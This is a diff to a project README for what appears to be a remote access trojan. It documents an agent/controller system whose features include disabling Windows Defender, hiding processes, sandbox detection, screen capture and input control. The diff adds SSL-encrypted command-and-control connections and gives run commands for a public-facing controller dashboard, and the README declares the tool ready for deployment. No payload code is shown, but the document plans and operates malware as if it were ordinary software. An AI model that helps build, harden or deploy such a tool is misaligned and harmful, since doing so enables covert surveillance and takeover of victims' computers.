@@ -90,13 +90,15 @@ The integrated system supports three operational modes:
 - Windows Defender neutralization
 - Process hiding from task manager
 - Anti-analysis and sandbox detection
-- Encrypted communications
+- **SSL/TLS encrypted communications**
+- **Automatic SSL certificate generation**
+- **Secure SocketIO connections with SSL verification**
 
 ## Dependencies
 Updated `requirements.txt` includes all necessary packages:
 
 ```
-socketio
+python-socketio
 requests
 mss
 numpy
@@ -118,7 +120,8 @@ flask-socketio
 pyautogui
 speech-recognition
 websockets
-asyncio
+cryptography
+pywin32; platform_system=="Windows"
 ```
 
 ## Conflict Resolutions
@@ -139,19 +142,34 @@ asyncio
 ```bash
 python main.py
 ```
-Connects to remote controller and provides full agent capabilities.
+Connects to remote controller and provides full agent capabilities with SSL verification enabled.
 
-### **Start as Controller:**
+### **Start as Controller with SSL (Recommended):**
 ```bash
-python main.py --mode controller
+python main.py --mode controller --port 8080
 ```
-Starts web dashboard at http://localhost:8080 for managing agents.
+Starts web dashboard at https://localhost:8080 with automatic SSL certificate generation.
 
-### **Start as Combined System:**
+### **Start as Controller without SSL:**
 ```bash
-python main.py --mode both
+python main.py --mode controller --port 8080 --no-ssl
 ```
-Runs both agent and controller simultaneously for testing or standalone operation.
+Starts web dashboard at http://localhost:8080 without SSL (for testing only).
+
+### **Start as Combined System with SSL:**
+```bash
+python main.py --mode both --port 8080
+```
+Runs both agent and controller simultaneously with SSL encryption.
+
+### **Additional Options:**
+```bash
+# Controller with custom host and port
+python main.py --mode controller --host 0.0.0.0 --port 443
+
+# Both mode without SSL (for development)
+python main.py --mode both --port 8080 --no-ssl
+```
 
 ## Architecture
 
@@ -176,5 +194,26 @@ main.py
     └── Component Initialization
 ```
 
+## SSL Implementation
+
+### **Automatic Certificate Generation**
+The system automatically generates self-signed SSL certificates for secure communications:
+
+1. **Cryptography Library** (Primary): Uses Python's cryptography package for certificate generation
+2. **OpenSSL Fallback**: Falls back to OpenSSL command-line tool if cryptography is unavailable
+3. **Dummy Certificate**: Creates placeholder files as last resort to prevent crashes
+
+### **SSL Features**
+- **Agent-Controller Communication**: SocketIO client connects with SSL verification enabled
+- **Web Dashboard**: HTTPS-enabled web interface with automatic protocol detection
+- **Certificate Management**: Self-signed certificates valid for 1 year
+- **Flexible Configuration**: SSL can be disabled with `--no-ssl` flag for development
+
+### **Security Considerations**
+- Self-signed certificates will show browser warnings (expected behavior)
+- For production use, replace with CA-signed certificates
+- SSL verification is enabled by default for maximum security
+- Protocol auto-detection ensures proper WebSocket security (ws:// vs wss://)
+
 ## Status: ✅ COMPLETE
-All files have been successfully merged and integrated. The system is ready for deployment and testing.
+All files have been successfully merged and integrated with full SSL support. The system uses proper SocketIO with SSL encryption and is ready for secure deployment and testing.
